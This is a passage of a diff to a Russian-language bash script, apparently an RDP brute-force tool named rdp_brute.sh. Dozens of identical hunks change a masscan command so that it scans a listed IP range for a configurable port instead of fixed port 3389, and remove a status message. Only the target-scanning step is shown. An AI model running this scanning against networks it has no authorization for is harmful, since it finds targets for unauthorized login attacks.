+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2052,7 +2056,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2067,7 +2071,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2101,7 +2105,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2116,7 +2120,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2150,7 +2154,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2165,7 +2169,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2199,7 +2203,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2214,7 +2218,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2247,7 +2251,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2262,7 +2266,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2296,7 +2300,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2311,7 +2315,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2344,7 +2348,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2359,7 +2363,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2392,7 +2396,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2407,7 +2411,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2439,7 +2443,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2454,7 +2458,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2488,7 +2492,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2503,7 +2507,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2537,7 +2541,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2552,7 +2556,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2586,7 +2590,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2601,7 +2605,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2635,7 +2639,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2650,7 +2654,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2684,7 +2688,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2699,7 +2703,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2733,7 +2737,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2748,7 +2752,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2782,7 +2786,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2797,7 +2801,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2831,7 +2835,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2846,7 +2850,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2880,7 +2884,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2895,7 +2899,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2929,7 +2933,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2944,7 +2948,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -2978,7 +2982,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -2993,7 +2997,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3027,7 +3031,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3042,7 +3046,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3076,7 +3080,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3091,7 +3095,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3125,7 +3129,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3140,7 +3144,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3174,7 +3178,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3189,7 +3193,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3223,7 +3227,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3238,7 +3242,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3272,7 +3276,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3287,7 +3291,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3321,7 +3325,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3336,7 +3340,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3370,7 +3374,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3385,7 +3389,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3419,7 +3423,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3434,7 +3438,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3468,7 +3472,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3483,7 +3487,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3517,7 +3521,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3532,7 +3536,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3566,7 +3570,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3581,7 +3585,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3615,7 +3619,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3630,7 +3634,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3664,7 +3668,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3679,7 +3683,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3713,7 +3717,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3728,7 +3732,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3761,7 +3765,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3776,7 +3780,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3810,7 +3814,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3825,7 +3829,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3859,7 +3863,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3874,7 +3878,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3908,7 +3912,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3923,7 +3927,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -3957,7 +3961,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -3972,7 +3976,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4006,7 +4010,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4021,7 +4025,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4055,7 +4059,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4070,7 +4074,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4104,7 +4108,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4119,7 +4123,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -4153,7 +4157,7 @@ echo -e "$red-------------------------------------------------------------------
 echo ""
 
 
-echo -e "$green Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
+
 
 
 echo ""
@@ -4168,7 +4172,7 @@ echo ""
 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
